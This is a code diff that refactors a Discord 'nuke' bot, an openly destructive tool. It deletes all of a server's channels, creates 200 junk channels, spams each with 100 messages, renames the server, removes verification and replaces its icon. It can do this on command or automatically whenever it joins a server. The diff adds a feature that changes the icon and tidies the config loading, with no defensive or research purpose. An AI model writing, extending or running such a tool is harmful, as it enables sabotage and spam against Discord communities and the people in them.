@@ -8,15 +8,24 @@ import os
 from discord.ext import commands
 import ctypes
 from pystyle import Colors, Center, Colorate, Write
+import aiohttp
+from dataclasses import dataclass
 
-with open("config.json", "r") as f:
-    config_data = json.load(f)
+@dataclass
+class Config:
+    pfp_url: str
+    nuke_on_join: bool
+    rename_guild: bool
+    channel_names: int
+    text: str
+    token: str
 
-nuke_on_join = config_data.get("nuke_on_join")
-rename_guild = config_data.get("rename_guild")
-channel_names = config_data.get("channel_names")
-text = config_data.get("text")
-token = config_data.get("token")
+def load_config():
+    with open("config.json", "r") as f:
+        config_data = json.load(f)
+    return Config(**config_data)
+
+config = load_config()
 
 intents = discord.Intents.all()
 
@@ -24,8 +33,8 @@ astrapy = commands.Bot(command_prefix="$", intents=intents)
 astrapy.remove_command('help')
 
 def generate_random_string(length=10):
-    ascii = 'ءآأؤإئابةتثجحخدذرزسشصضطظعغفقكلمنهوي'
-    return ''.join(random.choice(ascii) for i in range(length))
+    ascii_chars = 'ءآأؤإئابةتثجحخدذرزسشصضطظعغفقكلمنهوي'
+    return ''.join(random.choice(ascii_chars) for i in range(length))
 
 def set_console_title(title):
     ctypes.windll.kernel32.SetConsoleTitleW(title)
@@ -34,23 +43,23 @@ def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 async def delete_channels(guild):
-    print("[-] Service Started: Deleting Channels.", Colors.blue)
+    Write.Print("[-] Service Started: Deleting Channels.\n", Colors.cyan, interval=0.00000001)
     await asyncio.gather(*[channel.delete() for channel in guild.channels])
 
 async def create_channels(guild, num_channels):
-    print("[+] Service Started: Creating Channels.", Colors.blue)
+    Write.Print("[+] Service Started: Creating Channels.\n", Colors.green, interval=0.00000001)
     await asyncio.gather(*[guild.create_text_channel(name=generate_random_string()) for _ in range(num_channels)])
 
 async def send_messages(channel, num_messages):
-    print("[+] Service Started: Spamming Messages.", Colors.blue)
+    Write.Print("[+] Service Started: Spamming Messages.", Colors.blue, interval=0.00000001)
     for _ in range(num_messages):
         try:
-            await channel.send(text)
+            await channel.send(config.text)
         except discord.errors.HTTPException as e:
             if e.status == 429:
-                print(f"[!] Service Error: Rate limited!", Colors.red)
+                Write.Print(f"[!] Service Error: Rate Limited!", Colors.red, interval=0.00000001)
             else:
-                print(f"[!] Service Error: Error sending message: {e}", Colors.red)
+                Write.Print(f"[!] Service Error: Error Rate Limited", Colors.red, interval=0.00000001)
 
 @astrapy.event
 async def on_ready():
@@ -71,56 +80,50 @@ async def on_ready():
 
 @astrapy.event
 async def on_guild_channel_create(channel):
-    global messages_sent, created_count
-    created_count = len(channel.guild.channels)
     await send_messages(channel, 100)
 
 @astrapy.command()
 async def nuke(ctx):
+    print(f" ", Colors.red)
+    Write.Print(f"[/] Nuke activated ~ Preparing for the attack.\n", Colors.red, interval=0.00000001)
 
-    print(f"[/] Nuke activated ~ Preparing for the attack.", Colors.red)
-
-    global messages_sent, created_count
     await ctx.message.delete()
 
     try:
-        messages_sent = 0
-        created_count = 0
-
-        if rename_guild.lower() == "y":
-            guild_name = generate_random_string()
-            await ctx.guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
-            print(f"[+] Service Started: Renaming Guild To: {guild_name}", Colors.blue)
-        else:
-            await ctx.guild.edit(verification_level=discord.VerificationLevel.none)
+        await ctx.guild.edit(name=generate_random_string(), verification_level=discord.VerificationLevel.none)
+        Write.Print("[+] Service Started: Renaming Guild\n", Colors.dark_green, interval=0.00000001)
     except Exception as e:
-        print(f"[!] Service Error: Error editing guild: {e}", Colors.red)
+        Write.Print(f"[!] Service Error: Error editing guild: {e}\n", Colors.red, interval=0.00000001)
 
     if discord.VerificationLevel.none:
-        print(f"[+] Service Started: Edited Verification Level\n", Colors.blue)
+        Write.Print("[+] Service Started: Edited Verification Level\n", Colors.yellow, interval=0.00000001)
+
+    if config.pfp_url and config.pfp_url.strip() != "":
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(config.pfp_url) as resp:
+                    pfp_data = await resp.read()
+                    await ctx.guild.edit(icon=pfp_data)
+            Write.Print("[+] Service Started: Changed Server PFP\n", Colors.purple, interval=0.00000001)
+        except Exception as e:
+            Write.Print(f"[!] Service Error: Error changing Server PFP: {e}\n", Colors.red, interval=0.00000001)
 
     await delete_channels(ctx.guild)
     await create_channels(ctx.guild, 200)
 
 @astrapy.event
 async def on_guild_join(guild):
-    if nuke_on_join.lower() == "true":
+    if config.nuke_on_join:
         try:
-            if rename_guild.lower() == "y":
-                guild_name = generate_random_string()
-                await guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
-                print(f"[+] Service Started: Renaming Guild To: {guild_name}", Colors.blue)
-            else:
-                await guild.edit(verification_level=discord.VerificationLevel.none)
+            await guild.edit(name=generate_random_string(), verification_level=discord.VerificationLevel.none)
+            Write.Print("[+] Service Started: Renaming Guild\n", Colors.dark_green, interval=0.00000001)
 
             if discord.VerificationLevel.none:
-                print(f"=[+] Service Started: Edited Verification Level\n", Colors.red)
+                Write.Print("[+] Service Started: Edited Verification Level\n", Colors.red, interval=0.00000001)
 
             await delete_channels(guild)
             await create_channels(guild, 200)
         except Exception as e:
-            print(f"=[!] Service Error: Error editing guild: {e}", Colors.red)
+            Write.Print(f"[!] Service Error: Error editing guild: {e}\n", Colors.red, interval=0.00000001)
 
-astrapy.run(token)
-
-# Any suggestion, join the discord an create an /suggestion: https://discord.gg/baMAyb4jeG
+astrapy.run(config.token)
